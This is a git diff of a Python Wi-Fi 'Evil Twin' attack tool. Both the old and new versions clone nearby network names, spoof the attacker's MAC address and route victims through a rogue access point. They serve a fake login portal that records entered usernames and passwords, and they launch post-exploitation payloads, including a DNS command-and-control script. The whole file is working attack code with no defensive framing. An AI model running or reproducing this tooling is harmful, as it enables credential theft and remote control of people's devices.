@@ -2,127 +2,141 @@
 import os
 import sys
 import time
-import subprocess
-import argparse
+import signal
 import random
-from datetime import datetime
+import subprocess
+from rich.console import Console
+from rich.table import Table
 
-def generate_mac():
-    return "02:00:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(4))
+console = Console()
+clients = set()
+AP_IFACE = "wlan0mon"
+FAKE_SSID = ""
+CAPTIVE_PORTAL_DIR = "/opt/redot/portal"
+IP_LOG_FILE = "logs/wifi_clients.txt"
 
-def get_recon_ssids():
-    recon_file = "output/wifi_recon/ssids.txt"
-    if os.path.exists(recon_file):
-        with open(recon_file) as f:
-            return [line.strip() for line in f if line.strip()]
-    return []
+# --- Utility Functions ---
 
-def write_configs(ssid, iface, output_dir):
-    hostapd = f"""
-interface={iface}
-driver=nl80211
-ssid={ssid}
-channel=6
-hw_mode=g
-auth_algs=1
-ignore_broadcast_ssid=0
-    """
-    dnsmasq = f"""
-interface={iface}
-dhcp-range=10.0.0.10,10.0.0.100,12h
-dhcp-option=3,10.0.0.1
-dhcp-option=6,10.0.0.1
-address=/#/10.0.0.1
-    """
-    index_html = f"""
-<html>
-  <body>
-    <h2>{ssid} Wi-Fi Login</h2>
-    <form method="POST" action="/login">
-      Username: <input type="text" name="user"><br>
-      Password: <input type="password" name="pass"><br>
-      <input type="submit" value="Login">
-    </form>
-  </body>
-</html>
-    """
-    os.makedirs(f"{output_dir}/portal", exist_ok=True)
-    with open(f"{output_dir}/hostapd.conf", "w") as f: f.write(hostapd)
-    with open(f"{output_dir}/dnsmasq.conf", "w") as f: f.write(dnsmasq)
-    with open(f"{output_dir}/portal/index.html", "w") as f: f.write(index_html)
+def detect_interface():
+    result = subprocess.getoutput("iw dev | grep Interface | awk '{print $2}'")
+    interfaces = result.splitlines()
+    for iface in interfaces:
+        if "mon" in iface:
+            return iface
+    console.print("[!] No monitor mode interface found.", style="bold red")
+    sys.exit(1)
 
-def launch_flask_server(output_dir):
-    flask_code = f"""
-from flask import Flask, request
-import os
-app = Flask(__name__)
-@app.route('/')
-def index():
-    return open('{output_dir}/portal/index.html').read()
-@app.route('/login', methods=['POST'])
-def login():
-    user = request.form.get('user')
-    password = request.form.get('pass')
-    with open('{output_dir}/creds.txt', 'a') as f:
-        f.write(f"{{user}}:{{password}}\\n")
-    os.system("bash modules/payloads/watering_loop.sh &")
-    os.system("python3 modules/payloads/dns_c2.py --cmd whoami &")
-    return "Invalid credentials"
-app.run(host='0.0.0.0', port=80)
-    """
-    with open(f"{output_dir}/app.py", "w") as f: f.write(flask_code)
-    subprocess.Popen(["python3", f"{output_dir}/app.py"])
+def mac_spoof(interface):
+    console.print(f"[*] Spoofing MAC on {interface}...", style="bold yellow")
+    os.system(f"ifconfig {interface} down")
+    os.system(f"macchanger -r {interface}")
+    os.system(f"ifconfig {interface} up")
 
-def spoof_mac(interface):
-    subprocess.call(["ifconfig", interface, "down"])
-    new_mac = generate_mac()
-    subprocess.call(["macchanger", "-m", new_mac, interface])
-    subprocess.call(["ifconfig", interface, "up"])
-    return new_mac
+def list_real_ssids():
+    console.print("[*] Scanning for nearby SSIDs...", style="bold cyan")
+    os.system(f"airodump-ng {AP_IFACE} -w /tmp/scan --output-format csv &")
+    time.sleep(8)
+    os.system("pkill airodump-ng")
+    ssids = []
+    with open("/tmp/scan-01.csv", "r") as f:
+        for line in f:
+            if "WPA" in line or "WEP" in line:
+                parts = line.split(',')
+                ssid = parts[13].strip()
+                if ssid and ssid not in ssids:
+                    ssids.append(ssid)
+    return ssids[:5]
 
-def start_attack(ssid, iface, stealth):
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    output_dir = f"/tmp/wifi_twin_{timestamp}"
-    os.makedirs(output_dir, exist_ok=True)
+def launch_fake_ap(ssid):
+    global clients
+    console.print(f"[+] Launching fake AP: {ssid}", style="bold green")
+    os.system(f"airbase-ng -e \"{ssid}\" -c 6 {AP_IFACE} &")
+    time.sleep(4)
+    os.system("ifconfig at0 up 10.0.0.1 netmask 255.255.255.0")
+    os.system("iptables --flush")
+    os.system("iptables -t nat --flush")
+    os.system("iptables -P FORWARD ACCEPT")
+    os.system("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
+    os.system("iptables -A FORWARD -i at0 -j ACCEPT")
+    os.system("service dnsmasq restart")
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
-    print(f"[+] Preparing Evil Twin attack on SSID: {ssid}")
-    if stealth:
-        print("[*] Enabling stealth mode (MAC randomization)")
-        new_mac = spoof_mac(iface)
-        print(f"[+] New MAC for {iface}: {new_mac}")
+def deploy_captive_portal():
+    console.print("[*] Deploying credential-stealing captive portal...", style="bold yellow")
+    os.system(f"cp -r {CAPTIVE_PORTAL_DIR}/* /var/www/html/")
+    os.system("service apache2 start")
 
-    write_configs(ssid, iface, output_dir)
-    print("[+] Starting captive portal server...")
-    launch_flask_server(output_dir)
-    time.sleep(1)
-    print("[+] Launching hostapd...")
-    subprocess.Popen(["hostapd", f"{output_dir}/hostapd.conf"], stdout=subprocess.DEVNULL)
-    print("[+] Launching dnsmasq...")
-    subprocess.Popen(["dnsmasq", "-C", f"{output_dir}/dnsmasq.conf"], stdout=subprocess.DEVNULL)
+def monitor_clients():
+    console.print("[*] Monitoring IP connections to fake AP...", style="bold cyan")
+    seen = set()
+    while True:
+        output = subprocess.getoutput("arp -n")
+        for line in output.splitlines():
+            if "at0" in line or "10.0.0." in line:
+                parts = line.split()
+                if len(parts) > 0:
+                    ip = parts[0]
+                    if ip not in seen:
+                        seen.add(ip)
+                        with open(IP_LOG_FILE, "a") as log:
+                            log.write(f"{ip}\n")
+                        console.print(f"[+] New client connected: {ip}", style="bold green")
+        time.sleep(10)
 
-    print(f"[✓] Evil Twin running on {iface}. Credentials saved in {output_dir}/creds.txt")
+def kill_switch():
+    console.print("[!] Triggering kill switch...", style="bold red")
+    os.system("pkill airbase-ng")
+    os.system("service apache2 stop")
+    os.system("iptables --flush")
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    os.system("ifconfig at0 down")
+    sys.exit(0)
+
+def screenshot_login_page():
+    os.system("wkhtmltoimage http://10.0.0.1 index_screenshot.png")
+    console.print("[+] Screenshot of login page saved as index_screenshot.png", style="bold green")
+
+def post_exploitation_chain():
+    console.print("[*] Triggering post-exploitation payloads...", style="bold yellow")
+    os.system("python3 modules/payloads/dns_c2.py")
+    os.system("bash modules/payloads/watering_loop.sh")
+
+# --- Signal Handling ---
+
+def signal_handler(sig, frame):
+    kill_switch()
+
+signal.signal(signal.SIGINT, signal_handler)
+
+# --- Main Logic ---
+
+def main():
+    global FAKE_SSID
+    global AP_IFACE
+    AP_IFACE = detect_interface()
+    mac_spoof(AP_IFACE)
+
+    ssids = list_real_ssids()
+    console.print("\nAvailable SSIDs:", style="bold blue")
+    table = Table(show_header=True, header_style="bold magenta")
+    table.add_column("Index")
+    table.add_column("SSID")
+    for i, s in enumerate(ssids):
+        table.add_row(str(i + 1), s)
+    console.print(table)
+
+    console.print("\n[?] Choose SSID to clone or enter custom name:", style="bold cyan")
+    choice = input(f"Enter 1-{len(ssids)} or custom SSID: ").strip()
+    if choice.isdigit() and 1 <= int(choice) <= len(ssids):
+        FAKE_SSID = ssids[int(choice) - 1]
+    else:
+        FAKE_SSID = choice
+
+    launch_fake_ap(FAKE_SSID)
+    deploy_captive_portal()
+    screenshot_login_page()
+    post_exploitation_chain()
+    monitor_clients()
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Wi-Fi Evil Twin Attack Module")
-    parser.add_argument("--iface", default="wlan1mon", help="Wireless interface (monitor mode)")
-    parser.add_argument("--auto", action="store_true", help="Run fully automated mode")
-    parser.add_argument("--ssid", help="Specify SSID manually")
-    parser.add_argument("--stealth", action="store_true", help="Enable stealth MAC spoofing")
-    args = parser.parse_args()
-
-    ssid = args.ssid
-    if not ssid and not args.auto:
-        options = get_recon_ssids()
-        if options:
-            print("Choose SSID from recon:")
-            for idx, val in enumerate(options):
-                print(f"{idx+1}) {val}")
-            choice = int(input("Enter number or 0 for manual: "))
-            if choice > 0 and choice <= len(options):
-                ssid = options[choice - 1]
-            else:
-                ssid = input("Enter SSID manually: ")
-        else:
-            ssid = input("Enter SSID manually: ")
-
-    start_attack(ssid, args.iface, args.stealth)
+    main()
